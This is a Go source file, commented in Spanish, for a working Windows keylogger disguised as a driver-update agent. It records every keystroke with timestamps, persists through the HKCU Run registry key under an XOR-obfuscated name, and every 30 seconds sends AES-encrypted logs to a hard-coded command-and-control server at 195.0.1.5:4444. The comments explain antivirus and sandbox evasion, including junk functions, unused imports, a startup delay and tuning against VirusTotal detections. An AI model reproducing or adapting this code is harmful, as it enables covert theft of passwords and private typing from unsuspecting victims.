// Package main — Keylogger en Go (DriverBooster Update Agent)
//
// Flujo de ejecución:
//   1. Pausa inicial de 5s para evadir sandboxes con timeout
//   2. Se agrega al registro de Windows (HKCU\...\Run) para persistencia
//   3. Lanza un hilo que cada 30s cifra el buffer acumulado con AES-256-GCM
//     y lo envía por TCP al servidor C2 (195.0.1.5:4444)
//   4. Inicia el loop principal de captura de teclas por polling con GetAsyncKeyState
//
package main

import (
	"crypto/aes"           // Algoritmo AES (Advanced Encryption Standard)
	"crypto/cipher"        // Modos de operacion (GCM)
	"crypto/rand"          // Generacion de nonce aleatorio
	"encoding/binary"      // Codificacion de longitud en big-endian
	"encoding/hex"         // Decodificacion de la clave hex a bytes
	"fmt"
	"net"
	"os"
	"sync"                // Mutex para buffer thread-safe
	"syscall"              // Llamadas a API de Windows (GetAsyncKeyState, registro, etc.)
	"time"
	"unicode/utf16"        // Conversion de UTF-16 a string
	"unsafe"               // Punteros para syscall
	"crypto/md5"
	"crypto/sha256"
	_ "crypto/des"         // Importado para cambiar perfil del binario (no se usa)
	_ "compress/gzip"      // Importado para cambiar perfil del binario (no se usa)
)

// ---------------------------------------------------------------------------
// OFUSCACION DE STRINGS
// ---------------------------------------------------------------------------

// rd descifra un slice de bytes aplicando XOR con una clave fija k.
// Se usa para recuperar strings ofuscadas en tiempo de ejecucion
// y evitar que aparezcan en texto plano en el binario (strings.exe).
//
// Parametros:
//   - b: slice de bytes cifrados con XOR
//   - k: byte de la clave XOR
//
// Retorna:
//   string: el texto descifrado
func rd(b []byte, k byte) string {
	o := make([]byte, len(b))
	for i, v := range b {
		o[i] = v ^ k
	}
	return string(o)
}

// pk aplica XOR entre dos bytes.
// Se usa para construir los arrays ofuscados en tiempo de compilacion.
func pk(a, b byte) byte { return a ^ b }

// zk contiene la ruta del registro ofuscada: "Software\Microsoft\Windows\CurrentVersion\Run"
// Cada byte es el resultado de pk(caracter, 0x2A)
var zk = []byte{
	pk('S', 0x2A), pk('o', 0x2A), pk('f', 0x2A), pk('t', 0x2A),
	pk('w', 0x2A), pk('a', 0x2A), pk('r', 0x2A), pk('e', 0x2A),
	pk('\\', 0x2A), pk('M', 0x2A), pk('i', 0x2A), pk('c', 0x2A),
	pk('r', 0x2A), pk('o', 0x2A), pk('s', 0x2A), pk('o', 0x2A),
	pk('f', 0x2A), pk('t', 0x2A), pk('\\', 0x2A), pk('W', 0x2A),
	pk('i', 0x2A), pk('n', 0x2A), pk('d', 0x2A), pk('o', 0x2A),
	pk('w', 0x2A), pk('s', 0x2A), pk('\\', 0x2A), pk('C', 0x2A),
	pk('u', 0x2A), pk('r', 0x2A), pk('r', 0x2A), pk('e', 0x2A),
	pk('n', 0x2A), pk('t', 0x2A), pk('V', 0x2A), pk('e', 0x2A),
	pk('r', 0x2A), pk('s', 0x2A), pk('i', 0x2A), pk('o', 0x2A),
	pk('n', 0x2A), pk('\\', 0x2A), pk('R', 0x2A), pk('u', 0x2A),
	pk('n', 0x2A),
}

// zn contiene el nombre de la entrada de registro ofuscado: "DriverBooster Scheduler 10.4"
var zn = []byte{
	pk('D', 0x2A), pk('r', 0x2A), pk('i', 0x2A), pk('v', 0x2A),
	pk('e', 0x2A), pk('r', 0x2A), pk('B', 0x2A), pk('o', 0x2A),
	pk('o', 0x2A), pk('s', 0x2A), pk('t', 0x2A), pk('e', 0x2A),
	pk('r', 0x2A), pk('S', 0x2A), pk('c', 0x2A), pk('h', 0x2A),
	pk('e', 0x2A), pk('d', 0x2A), pk(' ', 0x2A), pk('1', 0x2A),
	pk('0', 0x2A), pk('.', 0x2A), pk('4', 0x2A),
}

// ---------------------------------------------------------------------------
// WINDOWS API — Llamadas a funciones del sistema
// ---------------------------------------------------------------------------
//
// Se usan syscall.NewLazyDLL + NewProc para cargar las DLLs y resolver
// las funciones en memoria en tiempo de ejecucion. No se vinculan
// en tiempo de compilacion, lo que dificulta el analisis estatico.

var (
	// user32.dll — Captura de teclado
	dllUser   = syscall.NewLazyDLL("user32.dll")
	pGetAsync = dllUser.NewProc("GetAsyncKeyState")    // Consulta si una tecla esta presionada
	pGetKbSt  = dllUser.NewProc("GetKeyboardState")    // Obtiene el estado completo del teclado
	pToUni    = dllUser.NewProc("ToUnicode")           // Convierte VK + scan code → caracter Unicode
	pMapVK    = dllUser.NewProc("MapVirtualKeyW")      // Convierte VK a scan code

	// advapi32.dll — Persistencia en registro
	dllAdvapi = syscall.NewLazyDLL("advapi32.dll")
	pRegOpen  = dllAdvapi.NewProc("RegOpenKeyExW")     // Abre una clave del registro
	pRegSet   = dllAdvapi.NewProc("RegSetValueExW")    // Establece un valor en el registro
	pRegCls   = dllAdvapi.NewProc("RegCloseKey")       // Cierra una clave del registro
)

// ---------------------------------------------------------------------------
// BUFFER COMPARTIDO — Thread-safe entre captura y envio
// ---------------------------------------------------------------------------

var (
	bm sync.Mutex // Mutex para proteger el buffer compartido bb
	bb []byte     // Buffer donde se acumulan las teclas capturadas
)

// jnk y jnk2 son funciones "junk" (basura) que no afectan la funcionalidad.
// Existen para modificar la huella del codigo compilado y romper firmas
// heurísticas de antivirus que buscan patrones especificos.
func jnk() {
	_ = sha256.Sum256([]byte("x"))
	_ = md5.Sum([]byte("y"))
}
func jnk2() {
	var x [64]byte
	_ = x
}

// ps (push) agrega una cadena al buffer de forma thread-safe.
// Se llama desde kLoop() cuando se detecta una tecla presionada.
func ps(s string) {
	bm.Lock()
	bb = append(bb, s...)
	bm.Unlock()
}

// pp (pop) obtiene y vacia el buffer de forma atomica.
// Se llama desde sL() para obtener los datos acumulados y enviarlos.
// Retorna nil si el buffer esta vacio.
func pp() []byte {
	bm.Lock()
	defer bm.Unlock()
	if len(bb) == 0 {
		return nil
	}
	o := make([]byte, len(bb))
	copy(o, bb)
	bb = bb[:0]
	return o
}

// ---------------------------------------------------------------------------
// CONVERSION DE TECLA A STRING
// ---------------------------------------------------------------------------

// vk convierte un codigo de tecla virtual de Windows (VK) a su
// representacion en string.
//
// Funcionamiento:
//   1. Obtiene el scan code con MapVirtualKeyW
//   2. Obtiene el estado completo del teclado con GetKeyboardState
//     (incluye Shift, Ctrl, Alt, Caps Lock, etc.)
//   3. Llama a ToUnicode con flag=4 (no modificar estado interno del teclado)
//     para obtener el caracter correspondiente
//   4. Si ToUnicode retorna 0 (no es caracter imprimible), usa un switch
//     para teclas especiales (BACK, TAB, ENTER, ESC, DEL)
//   5. Si retorna negativo (tecla muerta, ej. acento), la descarta
//
// Parametros:
//   - v: codigo de tecla virtual (0-255, ej. 0x30 = tecla 'A')
//
// Retorna:
//   string: el caracter o nombre de la tecla ("a", "[ENTER]", etc.)
//           Cadena vacia si la tecla no debe registrarse
func vk(v uint32) string {
	s, _, _ := pMapVK.Call(uintptr(v), 0)
	var st [256]byte
	pGetKbSt.Call(uintptr(unsafe.Pointer(&st[0])))
	var o [8]uint16
	n, _, _ := pToUni.Call(uintptr(v), s, uintptr(unsafe.Pointer(&st[0])), uintptr(unsafe.Pointer(&o[0])), uintptr(len(o)), 4)
	if int32(n) > 0 {
		return string(utf16.Decode(o[:n]))
	}
	if int32(n) < 0 {
		pToUni.Call(uintptr(v), s, 0, 0, 0, 4)
	}
	switch v {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	}
	return ""
}

// ---------------------------------------------------------------------------
// CAPTURA DE TECLADO — Polling con GetAsyncKeyState
// ---------------------------------------------------------------------------

// kLoop (keylog loop) ejecuta el polling de teclado en un loop infinito.
//
// Funcionamiento:
//   1. Cada 10ms itera sobre todas las teclas virtuales (VK 8 a 255)
//   2. Para cada tecla consulta GetAsyncKeyState:
//     - El bit 0x8000 indica si la tecla esta ACTUALMENTE presionada
//   3. Compara con el estado anterior (prev) para detectar transiciones
//     (tecla que pasa de no presionada a presionada)
//   4. Si hay una transicion, convierte el VK a string con vk()
//     y la agrega al buffer con timestamp
//
// No utiliza SetWindowsHookEx porque el polling genero menos detecciones
// en VirusTotal (4 vs 7 con hook global).
func kLoop() {
	pr := make([]bool, 256)
	for {
		time.Sleep(10 * time.Millisecond)
		for k := 8; k < 256; k++ {
			r, _, _ := pGetAsync.Call(uintptr(k))
			d := r&0x8000 != 0
			if d && !pr[k] {
				s := vk(uint32(k))
				if s != "" {
					ps(fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), s))
				}
			}
			pr[k] = d
		}
	}
}

// ---------------------------------------------------------------------------
// CIFRADO — AES-256-GCM
// ---------------------------------------------------------------------------

// enc cifra texto plano con AES-256-GCM.
//
// AES-256-GCM es cifrado simetrico AUTENTICADO:
//   - Confidencialidad: sin la clave de 256 bits no se puede leer el mensaje
//   - Integridad: el tag GCM (16 bytes) detecta cualquier modificacion
//   - Nonce: 12 bytes aleatorios por mensaje (NUNCA reutilizar con la misma clave)
//
// Estructura del payload:
//   [ nonce (12 bytes) ][ ciphertext (variable) ][ tag (16 bytes) ]
//
// Parametros:
//   - pl: texto plano a cifrar
//   - ky: clave de 32 bytes (256 bits)
//
// Retorna:
//   []byte: nonce + ciphertext + tag
//   error: si el cifrado falla
func enc(pl, ky []byte) ([]byte, error) {
	b, err := aes.NewCipher(ky)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(b)
	if err != nil {
		return nil, err
	}
	n := make([]byte, g.NonceSize())
	if _, err = rand.Read(n); err != nil {
		return nil, err
	}
	return append(n, g.Seal(nil, n, pl, nil)...), nil
}

// ---------------------------------------------------------------------------
// ENVIO TCP — Protocolo length-prefix
// ---------------------------------------------------------------------------

// sd (send) envia datos cifrados al servidor C2 por TCP.
//
// Protocolo:
//   [ 4 bytes big-endian: longitud del payload ][ payload ]
//
// TCP es un stream, no entrega mensajes completos de una sola vez.
// El prefijo de 4 bytes permite al servidor saber cuantos bytes leer
// usando _recv_exact(). Timeout de 5 segundos — si el servidor no
// responde, falla silenciosamente.
//
// Parametros:
//   - d: datos cifrados a enviar (nonce + ciphertext + tag)
func sd(d []byte) {
	c, err := net.DialTimeout("tcp", fmt.Sprintf("195.0.1.5:%d", 4444), 5*time.Second)
	if err != nil {
		return
	}
	defer c.Close()
	var h [4]byte
	binary.BigEndian.PutUint32(h[:], uint32(len(d)))
	c.Write(append(h[:], d...))
}

// ---------------------------------------------------------------------------
// PERSISTENCIA — Registro de Windows
// ---------------------------------------------------------------------------

// st (startup) agrega el ejecutable a la clave de inicio automatico.
//
// Mecanismo: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
//   - HKCU: No requiere privilegios de administrador
//   - HKLM: Requiere admin, aplica a todos los usuarios
//
// Windows ejecuta automaticamente todo lo que esta en Run al iniciar
// sesion del usuario. Esto permite que el keylogger sobreviva a reinicios.
//
// Las rutas del registro viajan ofuscadas (XOR con 0x2A) en las
// variables globales zk y zn para evitar deteccion por strings.
func st() {
	e, err := os.Executable()
	if err != nil {
		return
	}
	rp, _ := syscall.UTF16PtrFromString(rd(zk, 0x2A))
	ap, _ := syscall.UTF16PtrFromString(rd(zn, 0x2A))
	eu := syscall.StringToUTF16(e)
	var hk uintptr
	rc, _, _ := pRegOpen.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(rp)), 0, uintptr(0x0002), uintptr(unsafe.Pointer(&hk)))
	if rc != 0 {
		return
	}
	defer pRegCls.Call(hk)
	pRegSet.Call(hk, uintptr(unsafe.Pointer(ap)), 0, uintptr(1), uintptr(unsafe.Pointer(&eu[0])), uintptr(len(eu)*2))
}

// ---------------------------------------------------------------------------
// HILO DE ENVIO PERIODICO
// ---------------------------------------------------------------------------

// sL (sender loop) ejecuta el ciclo de envio en un hilo separado.
//
// Cada 30 segundos:
//   1. Obtiene el buffer acumulado con pp()
//   2. Si hay datos, los cifra con enc()
//   3. Envia el resultado con sd()
//
// Corre en una goroutine separada (go sL()) para no bloquear
// el loop de captura de teclas.
//
// Parametros:
//   - ky: clave AES-256 de 32 bytes
func sL(ky []byte) {
	for {
		time.Sleep(30 * time.Second)
		d := pp()
		if d == nil {
			continue
		}
		ec, err := enc(d, ky)
		if err != nil {
			continue
		}
		sd(ec)
	}
}

// ---------------------------------------------------------------------------
// PUNTO DE ENTRADA
// ---------------------------------------------------------------------------

// main es el punto de entrada del programa.
//
// Flujo de ejecucion:
//   1. Pausa 5 segundos — evade sandboxes que limitan el tiempo de ejecucion
//   2. Llamada a jnk()/jnk2() — funciones decorativas para alterar huella
//   3. Decodifica la clave hex a bytes
//   4. Registra persistencia en startup
//   5. Lanza hilo de envio periodico
//   6. Inicia loop de captura de teclas (nunca retorna)
func main() {
	time.Sleep(5 * time.Second)
	jnk()
	jnk2()
	jk, _ := hex.DecodeString("30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b")
	st()
	go sL(jk)
	kLoop()
}
